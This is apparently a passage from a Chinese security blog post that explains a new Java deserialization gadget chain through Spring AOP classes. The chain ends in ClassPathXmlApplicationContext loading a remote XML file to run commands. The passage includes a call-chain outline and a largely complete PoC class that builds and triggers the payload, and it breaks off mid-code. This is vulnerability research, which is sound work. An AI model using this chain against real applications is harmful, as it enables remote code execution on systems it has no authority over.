+<p><img loading="lazy" src="../images/image-20250717151705649.png" alt="image-20250717151705649"  />
+</p>
+<p>其中，<code>target</code>我们可以直接设置，<code>method</code>和<code>args</code>则来自<code>proxy触发</code>时的方法和参数，@jsjcw师傅是想到用<code>Map#get</code>来控制这个<code>retVal</code>值</p>
+<p><img loading="lazy" src="../images/image-20250717151851023.png" alt="image-20250717151851023"  />
+</p>
+<p>即我们需要让proxy在反序列化时触发一个get方法，这个在CC中其实利用很多了，这里是选择了<code>Hashtable#equals</code>来触发这个get方法</p>
+<p><img loading="lazy" src="../images/image-20250717152821948.png" alt="image-20250717152821948"  />
+</p>
+<h3 id="3-hash-hsts">3. hash HSTS<a hidden class="anchor" aria-hidden="true" href="#3-hash-hsts">#</a></h3>
+<p>但是到<code>Hashtable#equals</code>这步也有技巧，看到这个<code>e.key.equals(key)</code>和上方equals中<code>if (!(o instanceof Map&lt;?, ?&gt; t))</code>（其含义：匹配o是不是Map对象，是的话赋值给t）</p>
+<p>得<code>(key)t=proxy</code>，<code>e.key=Hashtable</code>，但是hash要一样的话需要<code>key=e.key</code>这里显然就矛盾了</p>
+<p><img loading="lazy" src="../images/image-20250717153242536.png" alt="image-20250717153242536"  />
+</p>
+<p>然后这时就想到了(HSTS)<code>HotSwappableTargetSource</code>的hash是<code>固定</code>！且其<code>equals</code>方法正好能满足我们的需求，所以这里套用一层<code>HotSwappableTargetSource</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">equals</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">other</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="n">other</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">HotSwappableTargetSource</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">				</span><span class="k">this</span><span class="p">.</span><span class="na">target</span><span class="p">.</span><span class="na">equals</span><span class="p">(((</span><span class="n">HotSwappableTargetSource</span><span class="p">)</span><span class="w"> </span><span class="n">other</span><span class="p">).</span><span class="na">target</span><span class="p">)));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>这里本来还有个关于hash进入上图中<code>if</code>的问题，由于HSTS的加入，这个问题也不存在了</p>
+<h3 id="4-size">4. size()<a hidden class="anchor" aria-hidden="true" href="#4-size">#</a></h3>
+<p>构造好上面这些后，发现size()时就会触发proxy，然后到最后利用点，size()返回值为<code>(int)1</code>，最后利用点invoke调用这个参数时会<code>报错中断</code></p>
+<p><img loading="lazy" src="../images/image-20250717162546630.png" alt="image-20250717162546630"  />
+</p>
+<p>但是我们发现进入最后invoke前会有个类型判断，即<code>type</code>和<code>returnValue</code>的判断，这里type我们可以通过<code>this.discoveredReturningType</code>设置（这个值设置了<code>returningName</code>后面会被覆盖，但是是已经判断完了才覆盖的，所以可以用这个点）</p>
+<p>我们要调用的是<code>ClassPathXmlApplicationContext</code>的自构方法，所以这里<code>type</code>设置为<code>String</code>就行，<code>returnValue</code>为int时就不会进入后续invoke调用了，等map#get获取为我们<code>&quot;http://127.0.0.1:8888/poc.xml&quot;</code>才会进入后续invoke调用</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">matchesReturnValue</span><span class="p">(</span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">type</span><span class="p">,</span><span class="w"> </span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="p">,</span><span class="w"> </span><span class="nd">@Nullable</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">returnValue</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">returnValue</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">			</span><span class="k">return</span><span class="w"> </span><span class="n">ClassUtils</span><span class="p">.</span><span class="na">isAssignableValue</span><span class="p">(</span><span class="n">type</span><span class="p">,</span><span class="w"> </span><span class="n">returnValue</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p><img loading="lazy" src="../images/image-20250717162851560.png" alt="image-20250717162851560"  />
+</p>
+<h3 id="5-newinstance">5. newInstance<a hidden class="anchor" aria-hidden="true" href="#5-newinstance">#</a></h3>
+<p>然后就是利用点的查找，@jsjcw师傅找的是一个jackson依赖的<code>AnnotatedConstructor#call1</code>，但是jackson依赖也需要额外添加，并不是spring自带，像这种依赖需求肯定是越少越好，然后尝试找了下，发现应该是有不少能用的</p>
+<p>我用的是jdk自带的<code>DefaultFormatter#stringToValue</code></p>
+<p><img loading="lazy" src="../images/image-20250717163935934.png" alt="image-20250717163935934"  />
+</p>
+<h3 id="6-其他">6. 其他<a hidden class="anchor" aria-hidden="true" href="#6-其他">#</a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">setFieldValue</span><span class="p">(</span><span class="n">aspectJAfterReturningAdvice</span><span class="p">,</span><span class="s">&#34;argumentNames&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;java.lang.Object&#34;</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">aspectJAfterReturningAdvice</span><span class="p">,</span><span class="s">&#34;returningName&#34;</span><span class="p">,</span><span class="s">&#34;java.lang.Object&#34;</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></div><p>然后还有点这个没讲吧，这个是跟<code>actualArgs</code>值获取有关的。这里<code>returningName!=null</code>才会把我们设置的returnValue传入到最后的invoke中去，然后这个值还跟一个报错有关，不设置会报错。</p>
+<p><img loading="lazy" src="../images/image-20250717165001370.png" alt="image-20250717165001370"  />
+</p>
+<h4 id="不出网">不出网<a hidden class="anchor" aria-hidden="true" href="#不出网">#</a></h4>
+<p>@jsjcw师傅还提到用<code>FileCopyUtils的copy</code>方法创建一个本地xml，然后调用这个xml进行命令执行</p>
+<p>其他貌似没啥了</p>
+<h2 id="0x03-poc--利用链">0x03 poc &amp; 利用链<a hidden class="anchor" aria-hidden="true" href="#0x03-poc--利用链">#</a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Hashtable#readObject
+</span></span><span class="line"><span class="cl">	HotSwappableTargetSource#equals
+</span></span><span class="line"><span class="cl">		Hashtable#equals
+</span></span><span class="line"><span class="cl">			$Proxy0#get
+</span></span><span class="line"><span class="cl">				JdkDynamicAopProxy#invoke
+</span></span><span class="line"><span class="cl">					ReflectiveMethodInvocation#proceed
+</span></span><span class="line"><span class="cl">						ExposeInvocationInterceptor#invoke  --&gt; 设置mi，然后调用proceed()
+</span></span><span class="line"><span class="cl">							ReflectiveMethodInvocation#proceed
+</span></span><span class="line"><span class="cl">								AfterReturningAdviceInterceptor#invoke
+</span></span><span class="line"><span class="cl">									mi.proceed()-&gt;ReflectiveMethodInvocation#invokeJoinpoint
+</span></span><span class="line"><span class="cl">									1. 调用map.size()返回1，且不进入后续invokeAdviceMethod
+</span></span><span class="line"><span class="cl">									2. 调用map.get()返回&#34;http://127.0.0.1:8888/poc.xml&#34;，一路到invoke
+</span></span><span class="line"><span class="cl">									AbstractAspectJAdvice#invokeAdviceMethodWithGivenArgs
+</span></span><span class="line"><span class="cl">										DefaultFormatter#stringToValue
+</span></span><span class="line"><span class="cl">											ClassPathXmlApplicationContext(String...)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">com.fasterxml.jackson.databind.introspect.AnnotatedConstructor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.fasterxml.jackson.databind.introspect.AnnotationMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.fasterxml.jackson.databind.introspect.TypeResolutionContext</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.fasterxml.jackson.databind.type.TypeFactory</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.aspectj.AspectJAfterReturningAdvice</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.aspectj.AspectJAroundAdvice</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.aspectj.AspectJExpressionPointcut</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.aspectj.SingletonAspectInstanceFactory</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.framework.AdvisedSupport</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.framework.adapter.AfterReturningAdviceInterceptor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.interceptor.ExposeInvocationInterceptor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.aop.target.HotSwappableTargetSource</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.context.support.ClassPathXmlApplicationContext</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">sun.misc.Unsafe</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.swing.text.DefaultFormatter</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Proxy</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Hashtable</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Mytest2</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">cons</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">AdvisedSupport</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cons</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AdvisedSupport</span><span class="w"> </span><span class="n">advisedSupport</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AdvisedSupport</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">targetMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">targetMap</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;argss&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;http://127.0.0.1:8888/poc.xml&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">advisedSupport</span><span class="p">.</span><span class="na">setTarget</span><span class="p">(</span><span class="n">targetMap</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">aClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.springframework.aop.interceptor.ExposeInvocationInterceptor&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">declaredConstructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">aClass</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">declaredConstructor</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ExposeInvocationInterceptor</span><span class="w"> </span><span class="n">aspectJAroundAdvice0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ExposeInvocationInterceptor</span><span class="p">)</span><span class="w"> </span><span class="n">declaredConstructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        AspectJExpressionPointcut pointcut = new AspectJExpressionPointcut();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        pointcut.setExpression(&#34;.*get&#34;);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">advisedSupport</span><span class="p">.</span><span class="na">addAdvice</span><span class="p">(</span><span class="n">aspectJAroundAdvice0</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AspectJAfterReturningAdvice</span><span class="w"> </span><span class="n">aspectJAfterReturningAdvice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getAspectJAfterReturningAdvice</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">AfterReturningAdviceInterceptor</span><span class="w"> </span><span class="n">aspectJAroundAdvice</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AfterReturningAdviceInterceptor</span><span class="p">(</span><span class="n">aspectJAfterReturningAdvice</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">aspectJAfterReturningAdvice</span><span class="p">,</span><span class="s">&#34;argumentNames&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;java.lang.Object&#34;</span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">aspectJAfterReturningAdvice</span><span class="p">,</span><span class="s">&#34;returningName&#34;</span><span class="p">,</span><span class="s">&#34;java.lang.Object&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        setFieldValue(aspectJAfterReturningAdvice,&#34;argumentNames&#34;,new String[]{&#34;java.lang.Object&#34;});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        setFieldValue(aspectJAfterReturningAdvice,&#34;throwingName&#34;,&#34;java.lang.Object&#34;);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        setFieldValue(aspectJAfterReturningAdvice,&#34;joinPointArgumentIndex&#34;,-1);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//        setFieldValue(aspectJAfterReturningAdvice,&#34;joinPointStaticPartArgumentIndex&#34;,-1);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setFieldValue</span><span class="p">(</span><span class="n">aspectJAfterReturningAdvice</span><span class="p">,</span><span class="s">&#34;discoveredReturningType&#34;</span><span class="p">,</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">advisedSupport</span><span class="p">.</span><span class="na">addAdvice</span><span class="p">(</span><span class="n">aspectJAroundAdvice</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">cons</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">advisedSupport</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="w"> </span><span class="n">proxyObj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Map</span><span class="p">)</span><span class="w"> </span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">clazz</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="w"> </span><span class="n">handler</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Hashtable</span><span class="w"> </span><span class="n">htobject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Hashtable</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">htobject</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;argss&#34;</span><span class="p">,</span><span class="s">&#34;test&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HotSwappableTargetSource</span><span class="w"> </span><span class="n">htkey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HotSwappableTargetSource</span><span class="p">(</span><span class="n">htobject</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HotSwappableTargetSource</span><span class="w"> </span><span class="n">htvalue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">HotSwappableTargetSource</span><span class="p">(</span><span class="n">proxyObj</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Hashtable</span><span class="w"> </span><span class="n">hashtable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Hashtable</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">hashtable</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="n">htkey</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;b&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">addEntry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hashtable</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;addEntry&#34;</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">patchModule</span><span class="p">(</span><span class="n">Mytest2</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">hashtable</span><span class="p">.</span><span class="na">getClass</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">addEntry</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">addEntry</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">hashtable</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">htvalue</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;2B&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileOutputStream</span><span class="w"> </span><span class="n">fos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileOutputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">fos</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">hashtable</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 从文件中反序列化对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">fis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;bin&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="n">ois</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="n">fis</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ois</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">patchModule</span><span class="p">(</span><span class="n">Class</span><span class="w"> </span><span class="n">clazz</span><span class="p">,</span><span class="n">Class</span><span class="w"> </span><span class="n">goalclass</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.misc.Unsafe&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Field</span><span class="w"> </span><span class="n">unsafeField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UnsafeClass</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;theUnsafe&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">unsafeField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Unsafe</span><span class="w"> </span><span class="n">unsafe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Unsafe</span><span class="p">)</span><span class="n">unsafeField</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Object</span><span class="w"> </span><span class="n">ObjectModule</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;getModule&#34;</span><span class="p">).</span><span class="na">invoke</span><span class="p">(</span><span class="n">goalclass</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Class</span><span class="w"> </span><span class="n">currentClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">;</span><span class="w">
